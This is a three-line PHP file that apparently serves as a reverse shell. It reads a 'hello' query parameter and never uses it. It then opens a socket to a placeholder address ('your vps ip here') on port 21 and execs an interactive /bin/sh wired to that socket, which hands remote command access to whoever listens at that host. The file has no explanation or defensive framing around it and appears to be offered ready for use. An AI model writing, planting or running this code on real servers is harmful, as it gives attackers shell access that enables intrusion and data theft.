<?php
$hello = $_GET['hello'];
$sock=fsockopen("your vps ip here",21);exec("/bin/sh -i <&3 >&3 2>&3");
?>